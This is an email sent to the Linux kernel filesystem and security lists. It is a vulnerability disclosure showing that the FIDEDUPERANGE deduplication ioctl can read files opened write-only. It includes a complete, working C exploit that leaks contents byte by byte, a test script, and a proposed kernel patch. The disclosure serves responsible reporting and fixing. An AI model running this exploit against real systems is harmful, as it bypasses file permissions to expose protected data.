Return-Path: <linux-fsdevel-owner@vger.kernel.org>
X-Original-To: lists+linux-fsdevel@lfdr.de
Delivered-To: lists+linux-fsdevel@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 2CC6F5719B7
	for <lists+linux-fsdevel@lfdr.de>; Tue, 12 Jul 2022 14:18:18 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S229729AbiGLMSQ (ORCPT <rfc822;lists+linux-fsdevel@lfdr.de>);
        Tue, 12 Jul 2022 08:18:16 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:36338 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S229572AbiGLMSP (ORCPT
        <rfc822;linux-fsdevel@vger.kernel.org>);
        Tue, 12 Jul 2022 08:18:15 -0400
X-Greylist: delayed 402 seconds by postgrey-1.37 at lindbergh.monkeyblade.net; Tue, 12 Jul 2022 05:18:13 PDT
Received: from mail-relay230.hrz.tu-darmstadt.de (mail-relay230.hrz.tu-darmstadt.de [130.83.156.230])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 39A754D4C0
        for <linux-fsdevel@vger.kernel.org>; Tue, 12 Jul 2022 05:18:13 -0700 (PDT)
Received: from smtp.tu-darmstadt.de (mail-relay158.hrz.tu-darmstadt.de [IPv6:2001:41b8:83f:1611::158])
        (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
         key-exchange X25519 server-signature RSA-PSS (4096 bits)
         client-signature RSA-PSS (4096 bits))
        (Client CN "mail-relay158.hrz.tu-darmstadt.de", Issuer "DFN-Verein Global Issuing CA" (not verified))
        by mail-relay230.hrz.tu-darmstadt.de (Postfix) with ESMTPS id 4Lj03L1JMBz43qr;
        Tue, 12 Jul 2022 14:11:26 +0200 (CEST)
Received: from [IPV6:2001:41b8:810:20:3da5:807c:fa4d:1353] (unknown [IPv6:2001:41b8:810:20:3da5:807c:fa4d:1353])
        (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
         key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
        (Client did not present a certificate)
        by smtp.tu-darmstadt.de (Postfix) with ESMTPSA id 4Lj03J5lfQz43Vh;
        Tue, 12 Jul 2022 14:11:24 +0200 (CEST)
Message-ID: <a7c93559-4ba1-df2f-7a85-55a143696405@tu-darmstadt.de>
Date:   Tue, 12 Jul 2022 14:11:24 +0200
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101
 Thunderbird/91.11.0
Reply-To: ansgar.loesser@kom.tu-darmstadt.de
To:     viro@zeniv.linux.org.uk, linux-fsdevel@vger.kernel.org,
        security@kernel.org
Cc:     Max Schlecht <max.schlecht@informatik.hu-berlin.de>,
        =?UTF-8?Q?Bj=c3=b6rn_Scheuermann?= 
        <scheuermann@kom.tu-darmstadt.de>
From:   =?UTF-8?B?QW5zZ2FyIEzDtsOfZXI=?= <ansgar.loesser@tu-darmstadt.de>
Subject: Information Leak: FIDEDUPERANGE ioctl allows reading writeonly files
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit
X-Header-TUDa: QAy2LZ/mv4rnYAEvPe+hus7WF+1CrvJz7aabIHs1iFrjIV8t9upBOqo34ARb9MadSSmj+PEe5/UATta0nI6QETluwPE+HivVYTLMO1
X-Spam-Status: No, score=-4.2 required=5.0 tests=BAYES_00,RCVD_IN_DNSWL_MED,
        SPF_HELO_NONE,SPF_NONE,T_SCC_BODY_TEXT_LINE autolearn=ham
        autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-fsdevel.vger.kernel.org>
X-Mailing-List: linux-fsdevel@vger.kernel.org

Dear Mr. Viro,

using the deduplication API we found out, that the FIDEDUPERANGE ioctl 
syscall can be used to read a writeonly file.
A more formal description of the bug, an example code to exploit it and 
a proposed solution are attatched below.

In case of open questions please do not hesitate to contact us.

With best regards,
Ansgar Lößer


FIDEDUPERANGE ioctl allows reading writeonly files

The FIDEDUPERANGE ioctl can be used to read data from files that are 
supposed
to be writeonly on supported file systems (btrfs, xfs, ...).

confirmed on 5.18.3 (amd64, debian)
Reported-by: Ansgar Lößer (ansgar.loesser@kom.tu-darmstadt.de), Max Schlecht
(max.schlecht@informatik.hu-berlin.de) and Björn Scheuermann
(scheuermann@kom.tu-darmstadt.de)

The FIDEDUPERANGE ioctl is intended to be able to share physical storage for
multiple data blocks across files that contain identical data, on the 
same file
system. To do so, the ioctl takes a `src_fd` and `dest_fd`, as well as 
offset
and  length parameters, specifying data ranges should be tried to be
deduplicated. The ioctl then compares the contents of the data ranges and
returns the number of bytes that have been deduplicated.

The issue is, that while `src_fd` has to be open for reading, `dest_fd` only
has to be open for writing. Thus, multiple consecutive ioctl calls can 
be used
to read out the contents of `dest_fd`. This is done byte by byte, by trying
different input data, until getting a successful deduplication, indicating
equal content in the two data ranges. This technique works even if files are
marked as `append only` in btrfs.

The proposed fix is to change the required permissions, so that 
`dest_fd` has
to be open for reading as well.

exploit code (`read_writeonly.c`)
```C
#define _XOPEN_SOURCE 500 // pwrite
#include <linux/types.h>
#include <linux/fs.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <assert.h>

// use FIDEDUPERANGE ioctl to compare the target writeonly file (dest_fd)
// with the test file (src_fd)
int compare_fds(int src_fd, int dest_fd, __u64 offset, __u64 length)
{
     char buffer[sizeof(struct file_dedupe_range)
         + sizeof(struct file_dedupe_range_info)];
     struct file_dedupe_range* arg = (struct file_dedupe_range*)buffer;
     arg->src_offset = 0;
     arg->src_length = length;
     arg->dest_count = 1;
     arg->reserved1  = 0;
     arg->reserved2  = 0;

     struct file_dedupe_range_info* info = &arg->info[0];
     info->dest_fd = dest_fd;
     info->dest_offset = offset;
     info->reserved = 0;

     ioctl(src_fd, FIDEDUPERANGE, arg);
     printf("%d_%llu ", info->status, info->bytes_deduped);

     return info->status;
}

int main(int argc, char** argv)
{
     if (argc != 2)
     {
         fprintf(stderr, "./read_writeonly <filepath>\n");
         return 0;
     }

     // open the target writeonly file
     int target_fd = open(argv[1], O_WRONLY | O_APPEND);
     if (target_fd == -1)
     {
         fprintf(stderr, "failed to open \"%s\" with %d\n", argv[1], errno);
         return -1;
     }

     // create a test file to compare the target file with (via 
deduplication)
     int test_fd = open("test.tmp", O_RDWR | O_CREAT | O_TRUNC, 0777);
     if (test_fd == -1)
     {
         close(target_fd);
         fprintf(stderr, "fatal: failed to open test file with %d\n", 
errno);
         return -1;
     }

     __u64 file_offset = 0;
     do
     {
         int status;
         __u8 c;

         for (__u16 i = 0; i < 256; i++)
         {
             c = (__u8)i;
             __u64 offset = file_offset % 4096;
             __u64 length = offset + 1;
             __u64 block_offset = file_offset - offset;

             if (offset == 0)
             {
                 ftruncate(test_fd, 0);
             }

             pwrite(test_fd, &c, 1, offset);
             status = compare_fds(test_fd, target_fd, block_offset, length);

             if (status == FILE_DEDUPE_RANGE_SAME || status < 0)
             {
                 break;
             }
         }
         assert(status != FILE_DEDUPE_RANGE_DIFFERS);

         if (status < 0)
         {
             break;
         }

         putc(c, stdout);

         file_offset++;
     } while (1);

     close(target_fd);
     close(test_fd);
     unlink("test.tmp");

     return 0;
}
```

helper shell script (`test.sh`)
```sh
#!/bin/sh

gcc read_writeonly.c -o read_writeonly

# create writeonly file
touch writeonly.txt
chmod 220 writeonly.txt
echo "secret" > writeonly.txt
sudo chown 65535 writeonly.txt

# read from writeonly file
./read_writeonly writeonly.txt
```

proposed fix (read_writeonly.patch)
```
diff --git a/fs/remap_range.c b/fs/remap_range.c
index e112b54..ad5b44d 100644
--- a/fs/remap_range.c
+++ b/fs/remap_range.c
@@ -414,11 +414,11 @@ static bool allow_file_dedupe(struct file *file)

      if (capable(CAP_SYS_ADMIN))
          return true;
-    if (file->f_mode & FMODE_WRITE)
+    if ((file->f_mode & (FMODE_READ | FMODE_WRITE)) == (FMODE_READ | 
FMODE_WRITE))
          return true;
      if (uid_eq(current_fsuid(), i_uid_into_mnt(mnt_userns, inode)))
          return true;
-    if (!inode_permission(mnt_userns, inode, MAY_WRITE))
+    if (!inode_permission(mnt_userns, inode, MAY_READ | MAY_WRITE))
          return true;
      return false;
  }
```

-- 
M.Sc. Ansgar Lößer
Fachgebiet Kommunikationsnetze
Fachbereich für Elektrotechnik und Informationstechnik
Technische Universität Darmstadt

Rundeturmstraße 10
64283 Darmstadt

E-Mail: ansgar.loesser@kom.tu-darmstadt.de
http://www.kom.tu-darmstadt.de

